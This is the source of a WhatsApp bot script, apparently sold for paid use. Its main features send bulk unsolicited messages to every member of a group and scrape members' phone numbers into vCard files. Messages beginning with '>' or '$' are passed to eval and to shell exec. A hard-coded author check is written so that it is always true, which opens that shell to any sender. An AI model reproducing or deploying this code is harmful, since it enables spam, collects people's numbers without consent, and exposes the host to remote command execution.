require('./config')
const {
	delay,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
} = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const {
    smsg,
    sleep,
    runtime,
    getBuffer,
    jsonformat,
    format,
    parseMention,
    getGroupAdmins
} = require('./db/function')


module.exports = chilo = async (chilo, m, chatUpdate, store) => { try {
var body = (m.mtype === 'conversation') ? m.message.conversation: (m.mtype == 'imageMessage') ? m.message.imageMessage.caption: (m.mtype == 'videoMessage') ? m.message.videoMessage.caption: (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text: (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId: (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId: (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId: (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text): ''
var budy = (typeof m.text == 'string' ? m.text: '')
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botId = await chilo.decodeJid(chilo.user.id)
const botNumber = botId.split('@')[0]
const ownId = ownNumb.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
const ownNumber = ownNumb.replace(/[^0-9]/g, '')
const dtext = args.join(" ")
const quoted = m.quoted ? m.quoted: m
const groupMetadata = m.isGroup ? await chilo.groupMetadata(m.chat).catch(e => {}): ''
const groupName = m.isGroup ? groupMetadata.subject: ''
const participants = m.isGroup ? await groupMetadata.participants: ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants): ''
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender): false
const isBotGroupAdmins = m.isGroup ? groupAdmins.includes(botId): false
const isAuthor = '6281254835351'+'@s.whatsapp.net'.includes(m.sender)
const isOwner = ownId.includes(m.sender) || isAuthor
const isMe = botId.includes(m.sender)

const reply = (teks) => { 
chilo.sendMessage(m.chat, { text : teks, contextInfo: { forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}

const ownSc = `68577776737992`
const ownScName = `Kyeruu-Botz`

if (command) {
	console.log()
	console.log(`${m.isGroup ? '\x1b[0;32mFOX\x1b[1;32m-host' : '\x1b[1;32mFOX-host'} \x1b[0m[ \x1b[1;37m${command} \x1b[0m] at \x1b[0;32m${calender}\x1b[0m\n› ${m.chat}\n› FROM :\x1b[0;37m${m.sender.split('@')[0]}\x1b[0m${m.pushName ? ', '+m.pushName : ''}\n› IN :\x1b[0;32m${m.isGroup ? groupName : ' chat private'}\x1b[0m`)
	chilo.readMessages([m.key])
}
switch (command) {

case 'menu': case 'help': {
const owned = `${ownSc}@s.whatsapp.net`
let menu = `


○ *Nama Bot :* Kyeruu-Botz,
○ *Version Bot :* Dean new simple
○ *Nama Owner :* ${ownName}
○ *Nomor Owner :* ${ownNumb}
○ *Runtime :* ${runtime(process.uptime())}


𝗣𝗨𝗦𝗛𝗞𝗢𝗡𝗧𝗔𝗞
⌯ cekid
⌯ cekid2
⌯ cekmember
⌯ pushkon
⌯ pushkon2
⌯ savekontak

𝗢𝗧𝗛𝗘𝗥𝗠𝗘𝗡𝗨
⌯ public
⌯ self
⌯ getkontak
⌯ sendkontak
⌯ sendkontag
⌯ owner
⌯ ownersc
⌯ sc
⌯ informasi
⌯ tutorpush

☍ 𝗖𝗵𝗶𝗹𝗼𝗼V3
${runtime(process.uptime())}

*© powered by ${ownName}*`
chilo.sendMessage(m.chat, { image: thumb, caption: menu, contextInfo: { mentionedJid: [owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break // (?); daftar menu


case "self":{
chilo.public = false
reply('*SELEB MODE*')
}
break

case "public":{
chilo.public = true
reply('*FRIENDLY MODE*')
}
break

case 'script': case 'sc': // hargai penerbit!
let soScript = `*BUY HARGA CUMA 10K*
`
reply(soScript)
break // (?); bot script

case 'runtime': case 'test':
reply(runtime(process.uptime()))
break // (?); runtime bot

case "informasi": case "info":
if (!isOwner) return reply('khusus own')
if (!dtext) return reply(mess.inf)
break
case "tutorpush":
let menunya = `𝗧𝗨𝗧𝗢𝗥 𝗣𝗨𝗦𝗛 ⚠️
 › lakukan perintah sesuai yg ada di menu
 › beda command bot gakan respon jadi  
   utamakan ketelitian
 › misal kalian mau cek id group
   Silahkan ketik .listgc
 › mau push ? Ketikan
  .pushkon atau .pushkonv2
   setelah itu ikuti intruksi yg di berikan oleh
   bot
 › masih bingun ? 
   chat own ketikan .ownersc
`
reply(menunya)
break
case 'ownersc':
let ownnContact = {
	displayName: "Contact", contacts: [{displayName: ownScName, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+ownScName+";;;\nFN:"+ownScName+"\nitem1.TEL;waid="+ownSc+":"+ownSc+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); kontak owner
let sooContact = await chilo.sendMessage(m.chat, {contacts: ownnContact},{quoted: m})
chilo.sendMessage(m.chat, {text: `*ITU KA OWNER SCNYA*\n*MAU BUY NO ENC ? CHAT AJA*`}, {quoted: sooContact})
break
case 'owner': case 'botowner':
let ownContact = {
	displayName: "Contact", contacts: [{displayName: ownName, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+ownName+";;;\nFN:"+ownName+"\nitem1.TEL;waid="+ownNumber+":"+ownNumber+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); kontak owner
let soContact = await chilo.sendMessage(m.chat, {contacts: ownContact}, {quoted: m})
setTimeout(() => {chilo.sendMessage(m.chat, {delete: soContact.key})}, 20000)
break

case 'getcontact': case 'getkontak':
if (!m.isGroup) return reply(mess.group)
if (!(isGroupAdmins || isOwner)) return reply('Khusus Admin')
huhuhs = await chilo.sendMessage(m.chat, {
    text: `*GROUP :* ${groupMetadata.subject}\n*MEMBER :* ${participants.length}`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
chilo.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break

case 'savekontak': case 'svkontak':
if (!m.isGroup) return reply(mess.group)
if (!(isGroupAdmins || isOwner)) return reply('admin_only')
let cmiggc = await chilo.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('Mengimpor '+cmiggc.participants.length+' kontak..')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
chilo.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'Group: *'+cmiggc.subject+'*\nParticipants total: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break

case 'sendkontak': case 'kontak':
if (!m.isGroup) return reply(mess.group)
if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
let snTak = dtext.split(' ')[1] ? dtext.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
chilo.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break

case 'sendkontag': case 'kontag':
if (!m.isGroup) return reply(mess.group)
if (!(isGroupAdmins || isOwner)) return reply('khusus admin')
if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
let sngTak = dtext.split(' ')[1] ? dtext.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak - hidetag
chilo.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
break

case 'cekid':
if (!isOwner) return reply(mess.owner)
await reply('*wait sedang mengambil data....*')
let getGroups = await chilo.groupFetchAllParticipating()
let gclish = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let gclist = gclish.map(v => v.id)
if (gclist.length > 2000) return reply(jsonformat(gclist))
let gctext = `𝗗𝗔𝗙𝗧𝗔𝗥 𝗚𝗖 𝗔𝗡𝗗𝗔\n*total :* ${gclist.length} GC`
for (let a of gclist) {
	let mdata = await chilo.groupMetadata(a)
	gctext += `\n\n*☍ NAME GC :* ${mdata.subject}\n*☍ MEMBER :* ${mdata.participants.length}\n*☍ ID :* ${mdata.id}`
} // (?); daftar chat grup
reply(gctext)
break

case "cekid2": {
if (!isOwner) return khususOwner()
reply(`*wait sedang mengambil data....*`)
let getGroups = await chilo.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let tekss = `𝗧𝗢𝗧𝗔𝗟 𝗚𝗥𝗢𝗨𝗣 : ${anu.length} Group\n\n`
for (let xnxx of anu) {
tekss += `${xnxx}\n`
}
reply(tekss + `\n𝗡𝗼𝘁𝗲 :\nKalo mau cek member ketik\n.cekmember idgc \nsalin terlebih dahulu idgc di atas`)
}
break

case "cekmember": {
if (!isOwner) return khususOwner()
if (!dtext) return reply("Id Nya Mana Kak?")
let cekmd = await chilo.groupMetadata(dtext)
let txrk = await chilo.sendMessage(m.chat, { text: `*Nama Group :* ${cekmd.subject}\n*Member :* ${cekmd.participants.length} Orang` }, { quoted: m})
await chilo.sendMessage(m.chat, { text: `*Kalo mau push ketik ke gni*\n.pushkon2 120363144535686704@g.us|halo meks save foxhost` }, { quoted: txrk })
}
break

case 'pushkon':
if (!isOwner) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!dtext) return reply('*SALAH DECK TUTOR NYA GINI*\n\n.pushkontak teksnya')
	let pkDetect = await chilo.groupMetadata(m.chat)
	if (pkDetect.participants.length > 20000) return reply(mess.maksimal)
	reply('*proses send ke* '+pkDetect.participants.length+' *kontak..*')
	for (let a of pkDetect.participants) {
	chilo.sendMessage(a.id, {text: dtext})
	await sleep(mess.delay) // SET JEDANYA DI SINI
} // (?); kirim pesan ke semua peserta grup
reply('*DONE YA*')
break

case 'pushkon2':
if (!isOwner) return reply(mess.owner)
	let phkid = dtext.split('|')[0]
	let phktxt = dtext.split('|')[1]
if (!phkid) return reply('*SALAH DECK TUTOR NYA GINI*\n\n.pushkon2 ID|teksnya')
if (!phktxt) return reply('*SALAH DECK TUTOR NYA GINI*\n\n.pushkon2 ID|teksnya')
	let pk2Detect = await chilo.groupMetadata(phkid)
	if (pk2Detect.participants.length > 20000) return reply(mess.maksimal)
	reply('*proses send ke* '+pk2Detect.participants.length+' *kontak..*')
	for (let a of pk2Detect.participants) {
	chilo.sendMessage(a.id, {text: phktxt})
	await sleep(mess.delay) // SET JEDA NYA DI SINI
} // (?); kirim pesan ke semua peserta grup (id)
reply('*DONE YA*')
break


default:

if (budy.startsWith('>')) {
    if (!isOwner) return
    try {
        let evaled = await eval(budy.slice(2))
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
        await reply(evaled)
    } catch (err) {
        await reply(String(err))
    }
}

if (budy.startsWith('$')) {
    if (!isOwner) return
    exec(budy.slice(2), (err, stdout) => {
        if (err) return reply(`${err}`)
        if (stdout) return reply(stdout)
    })
}
}
	} catch (err) {
		chilo.sendMessage(ownNumb.replace(/[^0-9]/g, '')+'@s.whatsapp.net', {text: util.format(err)}, {ephemeralExpiration: 86400, quoted: m})
		console.log('\x1b[1;31m'+err+'\x1b[0m')
	}
}


let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
	require('fs').unwatchFile(file)
	console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
	delete require.cache[file]
	require(file)
})